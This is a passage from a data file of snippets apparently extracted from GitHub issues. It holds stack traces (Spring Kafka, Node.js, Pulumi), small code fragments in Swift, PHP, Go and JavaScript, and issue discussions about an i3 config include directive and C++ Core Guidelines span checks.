org.springframework.kafka.listener.adapter.RecordMessagingMessageListenerAdapter.onMessage(RecordMessagingMessageListenerAdapter.java:86) ~[spring-kafka-2.5.5.RELEASE.jar:2.5.5.RELEASE]\r\n\tat org.springframework.kafka.listener.adapter.RecordMessagingMessageListenerAdapter.onMessage(RecordMessagingMessageListenerAdapter.java:51) ~[spring-kafka-2.5.5.RELEASE.jar:2.5.5.RELEASE]\r\n\tat org.springframework.kafka.listener.KafkaMessageListenerContainer$ListenerConsumer.doInvokeOnMessage(KafkaMessageListenerContainer.java:1880) ~[spring-kafka-2.5.5.RELEASE.jar:2.5.5.RELEASE]\r\n\tat org.springframework.kafka.listener.KafkaMessageListenerContainer$ListenerConsumer.invokeOnMessage(KafkaMessageListenerContainer.java:1862) ~[spring-kafka-2.5.5.RELEASE.jar:2.5.5.RELEASE]\r\n\tat org.springframework.kafka.listener.KafkaMessageListenerContainer$ListenerConsumer.doInvokeRecordListener(KafkaMessageListenerContainer.java:1799) ~[spring-kafka-2.5.5.RELEASE.jar:2.5.5.RELEASE]\r\n\tat org.springframework.kafka.listener.KafkaMessageListenerContainer$ListenerConsumer.access$1900(KafkaMessageListenerContainer.java:432) ~[spring-kafka-2.5.5.RELEASE.jar:2.5.5.RELEASE]\r\n\tat org.springframework.kafka.listener.KafkaMessageListenerContainer$ListenerConsumer$3.doInTransactionWithoutResult(KafkaMessageListenerContainer.java:1667) ~[spring-kafka-2.5.5.RELEASE.jar:2.5.5.RELEASE]\r\n\tat org.springframework.transaction.support.TransactionCallbackWithoutResult.doInTransaction(TransactionCallbackWithoutResult.java:36) ~[spring-tx-5.2.8.RELEASE.jar:5.2.8.RELEASE]\r\n\tat org.springframework.transaction.support.TransactionTemplate.execute(TransactionTemplate.java:140) ~[spring-tx-5.2.8.RELEASE.jar:5.2.8.RELEASE]\r\n\tat org.springframework.kafka.listener.KafkaMessageListenerContainer$ListenerConsumer.invokeRecordListenerInTx(KafkaMessageListenerContainer.java:1658) ~[spring-kafka-2.5.5.RELEASE.jar:2.5.5.RELEASE]\r\n\tat org.springframework.kafka.listener.KafkaMessageListenerContainer$ListenerConsumer.invokeRecordListener(KafkaMessageListenerContainer.java:1633) ~[spring-kafka-2.5.5.RELEASE.jar:2.5.5.RELEASE]\r\n\tat org.springframework.kafka.listener.KafkaMessageListenerContainer$ListenerConsumer.invokeListener(KafkaMessageListenerContainer.java:1366) ~[spring-kafka-2.5.5.RELEASE.jar:2.5.5.RELEASE]\r\n\tat org.springframework.kafka.listener.KafkaMessageListenerContainer$ListenerConsumer.pollAndInvoke(KafkaMessageListenerContainer.java:1082) ~[spring-kafka-2.5.5.RELEASE.jar:2.5.5.RELEASE]\r\n\tat org.springframework.kafka.listener.KafkaMessageListenerContainer$ListenerConsumer.run(KafkaMessageListenerContainer.java:990) ~[spring-kafka-2.5.5.RELEASE.jar:2.5.5.RELEASE]\r\n\tat java.base/java.util.concurrent.Executors$RunnableAdapter.call(Executors.java:515) ~[na:na]\r\n\tat java.base/java.util.concurrent.FutureTask.run(FutureTask.java:264) ~[na:na]\r\n\tat java.base/java.lang.Thread.run(Thread.java:832) ~[na:na]\r\nCaused by: org.springframework.dao.InvalidDataAccessApiUsageException: Target object must not be null; nested exception is java.lang.IllegalArgumentException: Target object must not be null\r\n\tat org.springframework.orm.jpa.EntityManagerFactoryUtils.convertJpaAccessExceptionIfPossible(EntityManagerFactoryUtils.java:374) ~[spring-orm-5.2.8.RELEASE.jar:5.2.8.RELEASE]\r\n\tat org.springframework.orm.jpa.vendor.HibernateJpaDialect.translateExceptionIfPossible(HibernateJpaDialect.java:257) ~[spring-orm-5.2.8.RELEASE.jar:5.2.8.RELEASE]\r\n\tat org.springframework.orm.jpa.AbstractEntityManagerFactoryBean.translateExceptionIfPossible(AbstractEntityManagerFactoryBean.java:528) ~[spring-orm-5.2.8.RELEASE.jar:5.2.8.RELEASE]\r\n\tat org.springframework.dao.support.ChainedPersistenceExceptionTranslator.translateExceptionIfPossible(ChainedPersistenceExceptionTranslator.java:61) ~[spring-tx-5.2.8.RELEASE.jar:5.2.8.RELEASE]\r\n\tat org.springframework.dao.support.DataAccessUtils.translateIfNecessary(DataAccessUtils.java:242) ~[spring-tx-5.2.8.RELEASE.jar:5.2.8.RELEASE]\r\n\tat org.springframework.dao.support.PersistenceExceptionTranslationInterceptor.invoke(PersistenceExceptionTranslationInterceptor.java:153) ~[spring-tx-5.2.8.RELEASE.jar:5.2.8.RELEASE]\r\n\tat org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:186) ~[spring-aop-5.2.8.RELEASE.jar:5.2.8.RELEASE]\r\n\tat org.springframework.data.jpa.repository.support.CrudMethodMetadataPostProcessor$CrudMethodMetadataPopulatingMethodInterceptor.invoke(CrudMethodMetadataPostProcessor.java:178) ~[spring-data-jpa-2.3.3.RELEASE.jar:2.3.3.RELEASE]\r\n\tat org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:186) ~[spring-aop-5.2.8.RELEASE.jar:5.2.8.RELEASE]\r\n\tat org.springframework.aop.interceptor.ExposeInvocationInterceptor.invoke(ExposeInvocationInterceptor.java:95) ~[spring-aop-5.2.8.RELEASE.jar:5.2.8.RELEASE]\r\n\tat org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:186) ~[spring-aop-5.2.8.RELEASE.jar:5.2.8.RELEASE]\r\n\tat org.springframework.aop.framework.JdkDynamicAopProxy.invoke(JdkDynamicAopProxy.java:212) ~[spring-aop-5.2.8.RELEASE.jar:5.2.8.RELEASE]\r\n\tat com.sun.proxy.$Proxy81.save(Unknown Source) ~[na:na]\r\n\tat com.example.config.KafaTransactionDLTConfiguration.send(KafaTransactionDLTConfiguration.java:148) ~[classes/:na]\r\n\tat com.example.config.KafaTransactionDLTConfiguration.listen(KafaTransactionDLTConfiguration.java:112) ~[classes/:na]\r\n\tat java.base/jdk.internal.reflect.NativeMethodAccessorImpl.invoke0(Native Method) ~[na:na]\r\n\tat java.base/jdk.internal.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) ~[na:na]\r\n\tat java.base/jdk.internal.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) ~[na:na]\r\n\tat java.base/java.lang.reflect.Method.invoke(Method.java:564) ~[na:na]\r\n\tat org.springframework.messaging.handler.invocation.InvocableHandlerMethod.doInvoke(InvocableHandlerMethod.java:171) ~[spring-messaging-5.2.8.RELEASE.jar:5.2.8.RELEASE]\r\n\tat org.springframework.messaging.handler.invocation.InvocableHandlerMethod.invoke(InvocableHandlerMethod.java:120) ~[spring-messaging-5.2.8.RELEASE.jar:5.2.8.RELEASE]\r\n\tat org.springframework.kafka.listener.adapter.HandlerAdapter.invoke(HandlerAdapter.java:48) ~[spring-kafka-2.5.5.RELEASE.jar:2.5.5.RELEASE]\r\n\tat org.springframework.kafka.listener.adapter.MessagingMessageListenerAdapter.invokeHandler(MessagingMessageListenerAdapter.java:329) ~[spring-kafka-2.5.5.RELEASE.jar:2.5.5.RELEASE]\r\n\t... 17 common frames omitted\r\nCaused by: java.lang.IllegalArgumentException: Target object must not be null\r\n\tat org.springframework.util.Assert.notNull(Assert.java:201) ~[spring-core-5.2.8.RELEASE.jar:5.2.8.RELEASE]\r\n\tat org.springframework.beans.AbstractNestablePropertyAccessor.setWrappedInstance(AbstractNestablePropertyAccessor.java:195) ~[spring-beans-5.2.8.RELEASE.jar:5.2.8.RELEASE]\r\n\tat org.springframework.beans.BeanWrapperImpl.setWrappedInstance(BeanWrapperImpl.java:153) ~[spring-beans-5.2.8.RELEASE.jar:5.2.8.RELEASE]\r\n\tat org.springframework.beans.AbstractNestablePropertyAccessor.setWrappedInstance(AbstractNestablePropertyAccessor.java:183) ~[spring-beans-5.2.8.RELEASE.jar:5.2.8.RELEASE]\r\n\tat org.springframework.beans.AbstractNestablePropertyAccessor.<init>(AbstractNestablePropertyAccessor.java:122) ~[spring-beans-5.2.8.RELEASE.jar:5.2.8.RELEASE]\r\n\tat org.springframework.beans.BeanWrapperImpl.<init>(BeanWrapperImpl.java:103) ~[spring-beans-5.2.8.RELEASE.jar:5.2.8.RELEASE]\r\n\tat org.springframework.data.util.DirectFieldAccessFallbackBeanWrapper.<init>(DirectFieldAccessFallbackBeanWrapper.java:36) ~[spring-data-commons-2.3.3.RELEASE.jar:2.3.3.RELEASE]\r\n\tat org.springframework.data.jpa.repository.support.JpaMetamodelEntityInformation.getId(JpaMetamodelEntityInformation.java:159) ~[spring-data-jpa-2.3.3.RELEASE.jar:2.3.3.RELEASE]\r\n\tat org.springframework.data.repository.core.support.AbstractEntityInformation.isNew(AbstractEntityInformation.java:42) ~[spring-data-commons-2.3.3.RELEASE.jar:2.3.3.RELEASE]\r\n\tat org.springframework.data.jpa.repository.support.JpaMetamodelEntityInformation.isNew(JpaMetamodelEntityInformation.java:246) ~[spring-data-jpa-2.3.3.RELEASE.jar:2.3.3.RELEASE]\r\n\tat org.springframework.data.jpa.repository.support.SimpleJpaRepository.save(SimpleJpaRepository.java:553) ~[spring-data-jpa-2.3.3.RELEASE.jar:2.3.3.RELEASE]\r\n\tat java.base/jdk.internal.reflect.NativeMethodAccessorImpl.invoke0(Native Method) ~[na:na]\r\n\tat java.base/jdk.internal.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) ~[na:na]\r\n\tat java.base/jdk.internal.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) ~[na:na]\r\n\tat java.base/java.lang.reflect.Method.invoke(Method.java:564) ~[na:na]\r\n\tat org.springframework.data.repository.core.support.ImplementationInvocationMetadata.invoke(ImplementationInvocationMetadata.java:72) ~[spring-data-commons-2.3.3.RELEASE.jar:2.3.3.RELEASE]\r\n\tat org.springframework.data.repository.core.support.RepositoryComposition$RepositoryFragments.invoke(RepositoryComposition.java:382) ~[spring-data-commons-2.3.3.RELEASE.jar:2.3.3.RELEASE]\r\n\tat org.springframework.data.repository.core.support.RepositoryComposition.invoke(RepositoryComposition.java:205) ~[spring-data-commons-2.3.3.RELEASE.jar:2.3.3.RELEASE]\r\n\tat org.springframework.data.repository.core.support.RepositoryFactorySupport$ImplementationMethodExecutionInterceptor.invoke(RepositoryFactorySupport.java:549) ~[spring-data-commons-2.3.3.RELEASE.jar:2.3.3.RELEASE]\r\n\tat org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:186) ~[spring-aop-5.2.8.RELEASE.jar:5.2.8.RELEASE]\r\n\tat org.springframework.data.repository.core.support.QueryExecutorMethodInterceptor.doInvoke(QueryExecutorMethodInterceptor.java:155) ~[spring-data-commons-2.3.3.RELEASE.jar:2.3.3.RELEASE]\r\n\tat org.springframework.data.repository.core.support.QueryExecutorMethodInterceptor.invoke(QueryExecutorMethodInterceptor.java:130) ~[spring-data-commons-2.3.3.RELEASE.jar:2.3.3.RELEASE]\r\n\tat org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:186) ~[spring-aop-5.2.8.RELEASE.jar:5.2.8.RELEASE]\r\n\tat org.springframework.data.projection.DefaultMethodInvokingMethodInterceptor.invoke(DefaultMethodInvokingMethodInterceptor.java:80) ~[spring-data-commons-2.3.3.RELEASE.jar:2.3.3.RELEASE]\r\n\tat org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:186) ~[spring-aop-5.2.8.RELEASE.jar:5.2.8.RELEASE]\r\n\tat org.springframework.transaction.interceptor.TransactionAspectSupport.invokeWithinTransaction(TransactionAspectSupport.java:367) ~[spring-tx-5.2.8.RELEASE.jar:5.2.8.RELEASE]\r\n\tat org.springframework.transaction.interceptor.TransactionInterceptor.invoke(TransactionInterceptor.java:118) ~[spring-tx-5.2.8.RELEASE.jar:5.2.8.RELEASE]\r\n\tat org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:186) ~[spring-aop-5.2.8.RELEASE.jar:5.2.8.RELEASE]\r\n\tat org.springframework.dao.support.PersistenceExceptionTranslationInterceptor.invoke(PersistenceExceptionTranslationInterceptor.java:139) ~[spring-tx-5.2.8.RELEASE.jar:5.2.8.RELEASE]\r\n\t... 34 common frames omitted\r\n"
    },
    {
        "logs": "`js\r\n// Babel OK, doesn't work on Node.js\r\nimport \"dotenv/config\";\r\n\r\n// Works on Node.js (and Babel etc)\r\n// See https://github.com/username_2/dotenv/issues/89#issuecomment-587753552\r\nimport \"dotenv/config.js\";\r\n"
    },
    {
        "logs": "`\r\n/usr/lib/node_modules/slackin/node_modules/args/dist/index.js:39\r\nclass Args {\r\n^^^^^\r\nSyntaxError: Unexpected reserved word\r\n    at Module._compile (module.js:439:25)\r\n    at Object.Module._extensions..js (module.js:474:10)\r\n    at Module.load (module.js:356:32)\r\n    at Function.Module._load (module.js:312:12)\r\n    at Module.require (module.js:364:17)\r\n    at require (module.js:380:17)\r\n    at Object.<anonymous> (/usr/lib/node_modules/slackin/bin/slackin:4:12)\r\n    at Module._compile (module.js:456:26)\r\n    at Object.Module._extensions..js (module.js:474:10)\r\n    at Module.load (module.js:356:32)\r\n"
    },
    {
        "logs": "```\r\n/usr/lib/node_modules/slackin/node_modules/args/dist/index.js:39\r\nclass Args {\r\n^^^^^\r\nSyntaxError: Unexpected reserved word\r\n    at Module._compile (module.js:439:25)\r\n    at Object.Module._extensions..js (module.js:474:10)\r\n    at Module.load (module.js:356:32)\r\n    at Function.Module._load (module.js:312:12)\r\n    at Module.require (module.js:364:17)\r\n    at require (module.js:380:17)\r\n    at Object.<anonymous> (/usr/lib/node_modules/slackin/bin/slackin:4:12)\r\n    at Module._compile (module.js:456:26)\r\n    at Object.Module._extensions..js (module.js:474:10)\r\n    at Module.load (module.js:356:32)\r\n"
    },
    {
        "logs": "` \r\nsearchTextField\r\n    .rx.textInput.text\r\n            .debounce(0.5 , scheduler: MainScheduler.instance)\r\n            .distinct() // Missing argument for parameter #1 in call \r\n            .filter({ (string : String?) -> Bool in\r\n                return (string?.characters.count)! > 2\r\n            })\r\n           \r\n            \r\n            .observeOn(MainScheduler.asyncInstance)\r\n            \r\n            .subscribe(onNext: { (text : String?) in\r\n                print(text!)\r\n                self.getCities(forCountryISO2Code: \"LB\", withQuery: text!)\r\n            })\r\n            .addDisposableTo(disposeBag)\r\n\r\n"
    },
    {
        "logs": "``` \r\nsearchTextField\r\n    .rx.textInput.text\r\n            .debounce(0.5 , scheduler: MainScheduler.instance)\r\n            .distinct() // Missing argument for parameter #1 in call \r\n            .filter({ (string : String?) -> Bool in\r\n                return (string?.characters.count)! > 2\r\n            })\r\n           \r\n            \r\n            .observeOn(MainScheduler.asyncInstance)\r\n            \r\n            .subscribe(onNext: { (text : String?) in\r\n                print(text!)\r\n                self.getCities(forCountryISO2Code: \"LB\", withQuery: text!)\r\n            })\r\n            .addDisposableTo(disposeBag)\r\n\r\n"
    },
    {
        "logs": "`\r\n$command = 'cd '.base_path().'; /usr/local/bin/php artisan backup:run';// > '.base_path().'/public/backuplog.txt 2>&1 &';\r\n        try{\r\n            passthru('whoami');\r\n            echo \"<br>\";\r\n            passthru($command);\r\n            echo \"<br>\";\r\n            echo $command.\"<br>\";\r\n            $command = 'cd '.base_path().'; php artisan backup:run';\r\n           echo  exec($command);\r\n           //$p = \\Artisan::call('backup:run');\r\n        }\r\n        catch(\\Exception $e){\r\n            return $e;\r\n        }\r\n"
    },
    {
        "logs": "`\r\nbrew install git && brew tap caskroom/cask && brew cask install docker docker-compose\r\n=> Error: Cask 'docker-compose' is unavailable: No Cask with this name exists.\r\n"
    },
    {
        "logs": "```\r\nbrew install git && brew tap caskroom/cask && brew cask install docker docker-compose\r\n=> Error: Cask 'docker-compose' is unavailable: No Cask with this name exists.\r\n"
    },
    {
        "logs": "`\r\ntype DB interface {\r\n        CreateTable(*dynamodb.CreateTableInput) (*dynamodb.CreateTableOutput, error)\r\n        DeleteItem(*dynamodb.DeleteItemInput) (*dynamodb.DeleteItemOutput, error)\r\n        GetItem(*dynamodb.GetItemInput) (*dynamodb.GetItemOutput, error)\r\n        PutItem(*dynamodb.PutItemInput) (*dynamodb.PutItemOutput, error)\r\n        UpdateItem(*dynamodb.UpdateItemInput) (*dynamodb.UpdateItemOutput, error)\r\n}\r\n"
    },
    {
        "logs": "```\r\ntype DB interface {\r\n        CreateTable(*dynamodb.CreateTableInput) (*dynamodb.CreateTableOutput, error)\r\n        DeleteItem(*dynamodb.DeleteItemInput) (*dynamodb.DeleteItemOutput, error)\r\n        GetItem(*dynamodb.GetItemInput) (*dynamodb.GetItemOutput, error)\r\n        PutItem(*dynamodb.PutItemInput) (*dynamodb.PutItemOutput, error)\r\n        UpdateItem(*dynamodb.UpdateItemInput) (*dynamodb.UpdateItemOutput, error)\r\n}\r\n"
    },
    {
        "logs": "`\r\nIn RequestException.php line 113:\r\n                                                                               \r\n  Client error: "
    },
    {
        "logs": "` main config wont change. Even if variables can just be in main config that good enought. As for compiling 4.20 and trying, unfortunatly I can't. I have a production environment and unstable/testing is not an option. But I will try stable version when its out. If anyone else that can test it this will be great. Thank you for taking your time to implement this correctly.\n<issue_comment>username_2: Perhaps @username_0 and/or @username_1 could chime in or give the proposed code a spin?\n<issue_comment>username_5: We could also ask users on Reddit to test this. It's a pretty popular request especially in those kinds of communities, so I'm fairly sure we'd find some people there.\r\n\r\nI can also prepare an i3-gaps branch as some may want to try it but are using i3-gaps.\n<issue_comment>username_2: That\u2019s a great idea! Can you post on Reddit please?\n<issue_comment>username_6: I'm not sure if Moritz is around right now to do testing, but I'll do some testing with Regolith in the coming week or next (in the final lap of a release at the moment).\n<issue_comment>username_5: [Done](https://www.reddit.com/r/i3wm/comments/ndtbcf/looking_for_testers_for_the_new_include_directive/)\n<issue_comment>username_6: ## Testing Status Report\r\n\r\n### Environment\r\n\r\nFresh install of Ubuntu Hirsute running (pre-release) Regolith 1.6.\r\n\r\n### Test Strategy\r\n\r\n1. Compile i3-gaps "
    },
    {
        "logs": "`.  Modify Regolith session init script to call local build of i3 rather than the one shipped in the i3-gaps package\r\n2. Make a small change to config, remove keybinding stanza for gnome control center and put in a seperate file "
    },
    {
        "logs": "` partial.\r\n3. Log into a fresh session\r\n\r\nObservations\r\n1. Keybinding to gnome control center continues to work, telling me that the partial has been loaded successfully\r\n2. Unexpectedly upon startup, rather than starting with workspace 1 I see workspace 11. (see screenshot)\r\n3. If I keep the "
    },
    {
        "logs": "` version of i3-gaps binary but revert to the (Regolith) default config, upon login I see workspace 1.  So it seems that loading workspace 11 by default is connected to the include expression or some side effect.\r\n4. reverting back to stock i3-gaps bin w/ (Regolith) stock config file shows default workspace as 1\r\n\r\nConfig files are attached.\r\n\r\n![Screenshot from 2021-05-16 15-44-30](https://user-images.githubusercontent.com/49683/118415710-dadd8b80-b660-11eb-8ff0-6b2e60168eb0.png)\r\n[config-files.tar.gz](https://github.com/i3/i3/files/6490220/config-files.tar.gz)\n<issue_comment>username_2: Thanks for the report, @username_6!\r\n\r\nI have fixed the issue and added a test.\r\n\r\n@username_5 might need to pull my "
    },
    {
        "logs": "`).Scan(&dest); err != nil {                                                 \r\n        return nil, fmt.Errorf(\"failed: %w\", err)\r\n    }                               \r\n"
    },
    {
        "logs": "`\r\nMigrating from the OpenJDK legacy image to the newest image is a small config change.\r\n\r\ncircleci/openjdk:11.0.0 -> cimg/openjdk:11.0.0\r\n"
    },
    {
        "logs": "```\r\nMigrating from the OpenJDK legacy image to the newest image is a small config change.\r\n\r\ncircleci/openjdk:11.0.0 -> cimg/openjdk:11.0.0\r\n"
    },
    {
        "logs": "`\r\n================================================================================\r\nThe Pulumi CLI encountered a fatal error. This is a bug!\r\nWe would appreciate a report: https://github.com/pulumi/pulumi/issues/\r\nPlease provide all of the below text in your report.\r\n================================================================================\r\nPulumi Version:   v3.12.0\r\nGo Version:       go1.17\r\nGo Compiler:      gc\r\nArchitecture:     amd64\r\nOperating System: darwin\r\nPanic:            interface conversion: interface {} is nil, not string\r\n\r\ngoroutine 1 [running]:\r\nruntime/debug.Stack()\r\n\t/usr/local/Cellar/go/1.17/libexec/src/runtime/debug/stack.go:24 +0x65\r\nmain.panicHandler()\r\n\t/private/tmp/pulumi-20210909-33633-18beiyj/pkg/cmd/pulumi/main.go:29 +0x3d\r\npanic({0x5443820, 0xc00023af90})\r\n\t/usr/local/Cellar/go/1.17/libexec/src/runtime/panic.go:1038 +0x215\r\nmain.getNodeProgramDependencies({0xc00017ed70, 0x37}, 0x0)\r\n\t/private/tmp/pulumi-20210909-33633-18beiyj/pkg/cmd/pulumi/about.go:705 +0x1be5\r\nmain.getProgramDependenciesAbout(0xc000915828, {0xc00017ed70, 0x2000}, 0x0)\r\n\t/private/tmp/pulumi-20210909-33633-18beiyj/pkg/cmd/pulumi/about.go:766 +0x8c\r\nmain.getSummaryAbout(0x12)\r\n\t/private/tmp/pulumi-20210909-33633-18beiyj/pkg/cmd/pulumi/about.go:148 +0x4e5\r\nmain.newAboutCmd.func1(0x0, {0x7020106, 0x0, 0xc000915d78})\r\n\t/private/tmp/pulumi-20210909-33633-18beiyj/pkg/cmd/pulumi/about.go:77 +0x45\r\ngithub.com/pulumi/pulumi/sdk/v3/go/common/util/cmdutil.RunFunc.func1(0xd, {0x682bb28, 0xc000915d90, 0x41eacf3})\r\n\t/private/tmp/pulumi-20210909-33633-18beiyj/sdk/go/common/util/cmdutil/exit.go:96 +0x26\r\ngithub.com/pulumi/pulumi/sdk/v3/go/common/util/cmdutil.RunResultFunc.func1(0xc00096b8c0, {0x682bb28, 0x0, 0x0})\r\n\t/private/tmp/pulumi-20210909-33633-18beiyj/sdk/go/common/util/cmdutil/exit.go:112 +0x4f\r\ngithub.com/spf13/cobra.(*Command).execute(0xc00096b8c0, {0x682bb28, 0x0, 0x0})\r\n\t/Users/brew/Library/Caches/Homebrew/go_mod_cache/pkg/mod/github.com/spf13/cobra@v1.0.0/command.go:846 +0x5f8\r\ngithub.com/spf13/cobra.(*Command).ExecuteC(0xc0003eb340)\r\n\t/Users/brew/Library/Caches/Homebrew/go_mod_cache/pkg/mod/github.com/spf13/cobra@v1.0.0/command.go:950 +0x3ad\r\ngithub.com/spf13/cobra.(*Command).Execute(...)\r\n\t/Users/brew/Library/Caches/Homebrew/go_mod_cache/pkg/mod/github.com/spf13/cobra@v1.0.0/command.go:887\r\nmain.main()\r\n\t/private/tmp/pulumi-20210909-33633-18beiyj/pkg/cmd/pulumi/main.go:48 +0x45\r\n"
    },
    {
        "logs": "```\r\n================================================================================\r\nThe Pulumi CLI encountered a fatal error. This is a bug!\r\nWe would appreciate a report: https://github.com/pulumi/pulumi/issues/\r\nPlease provide all of the below text in your report.\r\n================================================================================\r\nPulumi Version:   v3.12.0\r\nGo Version:       go1.17\r\nGo Compiler:      gc\r\nArchitecture:     amd64\r\nOperating System: darwin\r\nPanic:            interface conversion: interface {} is nil, not string\r\n\r\ngoroutine 1 [running]:\r\nruntime/debug.Stack()\r\n\t/usr/local/Cellar/go/1.17/libexec/src/runtime/debug/stack.go:24 +0x65\r\nmain.panicHandler()\r\n\t/private/tmp/pulumi-20210909-33633-18beiyj/pkg/cmd/pulumi/main.go:29 +0x3d\r\npanic({0x5443820, 0xc00023af90})\r\n\t/usr/local/Cellar/go/1.17/libexec/src/runtime/panic.go:1038 +0x215\r\nmain.getNodeProgramDependencies({0xc00017ed70, 0x37}, 0x0)\r\n\t/private/tmp/pulumi-20210909-33633-18beiyj/pkg/cmd/pulumi/about.go:705 +0x1be5\r\nmain.getProgramDependenciesAbout(0xc000915828, {0xc00017ed70, 0x2000}, 0x0)\r\n\t/private/tmp/pulumi-20210909-33633-18beiyj/pkg/cmd/pulumi/about.go:766 +0x8c\r\nmain.getSummaryAbout(0x12)\r\n\t/private/tmp/pulumi-20210909-33633-18beiyj/pkg/cmd/pulumi/about.go:148 +0x4e5\r\nmain.newAboutCmd.func1(0x0, {0x7020106, 0x0, 0xc000915d78})\r\n\t/private/tmp/pulumi-20210909-33633-18beiyj/pkg/cmd/pulumi/about.go:77 +0x45\r\ngithub.com/pulumi/pulumi/sdk/v3/go/common/util/cmdutil.RunFunc.func1(0xd, {0x682bb28, 0xc000915d90, 0x41eacf3})\r\n\t/private/tmp/pulumi-20210909-33633-18beiyj/sdk/go/common/util/cmdutil/exit.go:96 +0x26\r\ngithub.com/pulumi/pulumi/sdk/v3/go/common/util/cmdutil.RunResultFunc.func1(0xc00096b8c0, {0x682bb28, 0x0, 0x0})\r\n\t/private/tmp/pulumi-20210909-33633-18beiyj/sdk/go/common/util/cmdutil/exit.go:112 +0x4f\r\ngithub.com/spf13/cobra.(*Command).execute(0xc00096b8c0, {0x682bb28, 0x0, 0x0})\r\n\t/Users/brew/Library/Caches/Homebrew/go_mod_cache/pkg/mod/github.com/spf13/cobra@v1.0.0/command.go:846 +0x5f8\r\ngithub.com/spf13/cobra.(*Command).ExecuteC(0xc0003eb340)\r\n\t/Users/brew/Library/Caches/Homebrew/go_mod_cache/pkg/mod/github.com/spf13/cobra@v1.0.0/command.go:950 +0x3ad\r\ngithub.com/spf13/cobra.(*Command).Execute(...)\r\n\t/Users/brew/Library/Caches/Homebrew/go_mod_cache/pkg/mod/github.com/spf13/cobra@v1.0.0/command.go:887\r\nmain.main()\r\n\t/private/tmp/pulumi-20210909-33633-18beiyj/pkg/cmd/pulumi/main.go:48 +0x45\r\n"
    },
    {
        "logs": "`shell\nPlease note that these warnings are just used to help the Homebrew maintainers\r\nwith debugging if you file an issue. If everything you use Homebrew for is\r\nworking fine: please don't worry or file an issue; just ignore this. Thanks!\r\n\r\nWarning: \"config\" scripts exist outside your system or Homebrew directories.\r\n"
    },
    {
        "logs": "` ints, added an assertion for its size getting close to 20 (so that I can notice a potential performance problem), and went on with my life: zero run time cost, vs 99% of time spent on malloc and accessing memory if I switch it to a std::set...\n<issue_comment>username_0: You would at least need 2 spans to implement vector, and to be able to move their bounds (or do pointer arithmetic on them...). I also don't know how "
    },
    {
        "logs": "` handles uninitialized memory, but you would need one of the spans to at least cover a region of uninitialized memory to get vector semantics :/ \r\n\r\nNothing is impossible, but using spans feels to me like using the worst tool for the job. When the only thing you have is a hammer though...\n<issue_comment>username_3: I agree that using "
    },
    {
        "logs": "` then you need to selectively apply the guidelines, e.g. by teaching your checker to ignore certain code. That doesn't seem like a problem with the guidelines themselves, but the checker and/or your use of it.\n<issue_comment>username_2: IIRC, you can use -isystem instead of -I when including a directory to disable warning on files included from that directory.\n<issue_comment>username_0: @username_3 I'll see if I can disable that particular check in the required places only via clang-tidy. I just have a .clang-tidy file, and for now just enable/disable them globally. \r\n\r\nMy point was more than maybe \"Use span\" is too much of a black/white recommendation, and clang-tidy just copies the recommendations from here. Nothing is black and white. \r\n\r\nIf clang-tidy tells me \"Prefer to use span, or if you really need pointer arithmetic, write // NO-TIDY CHECKXYZ123 on this line to disable it\", then I might keep the check. \r\n\r\nIf it tells me \"Use span\"... I'm like, this check is broken.\n<issue_comment>username_4: Personally I'm not a big fan of gal::span anymore, but I think it would be more helpful to make a feature request against clang tidy to allow suppression of specific checks than arguing about how strictly the guidelines should be worded. \r\n\r\nEven if you'd change the rule to be less black and white, clang tidy would still warn about it and you'd still need a way to deactivate it. Also, I guess a lot of other checks could profit from such a mechanism.\n<issue_comment>username_5: I think the primary question here is how to not get warnings on 'other people's code' that we don't control (e.g., we're not going to ask people to reimplement their implementation of vector).\r\n\r\nMSVC /analyze allows you to skip headers. This sounds like a request for the clang-tidy team?\n<issue_comment>username_6: To the original point by @username_0, the Guidelines are designed to apply to the majority of user code. People who implement libraries, or have sections of very low-level code (e.g. OS kernels or hardware access in device drivers) may find that some specific guidelines do not apply to them. That doesn't limit the usefulness of the Guidelines as most people use a "
    },
    {
        "logs": "` or graph data structure, fewer people implement one.\r\n\r\nNonetheless, the fact we can't allow for every context in a rule is why we hope that tools that check the Guidelines will provide flexible mechanisms for excluding code from analysis and suppressing individual warnings. I'm pretty sure clang-tidy does offer such mechanisms, although I'm no expert in them. If it doesn't, I'm sure the clang-tidy folks would be interested in a feature request ;-)\r\n\r\nAnd just to answer the observation about implementing a "
    },
    {
        "logs": "`).\n<issue_comment>username_7: I'm wondering - perhaps it would be beneficial to assign special meaning (from the guidelines' point of view) to any namespace (or nested namespace) named unsafe somewhat like it's done in Rust with unsafe blocks (it won't have syntactic support, but I believe it would be more readable than littering code with linter-disabling comments). This approach would allow clean separation of low level code from higher level constructs. As an example:\r\n"
    },
    {
        "logs": "`W0809 12:49:09.825091    6833 kubelet_node_status.go:502] Failed to set some node status fields: can't get ip address of node ubuntrancher. error: no default routes found in \"/proc/net/route\" or \"/proc/net/ipv6_ro"
    },
    {
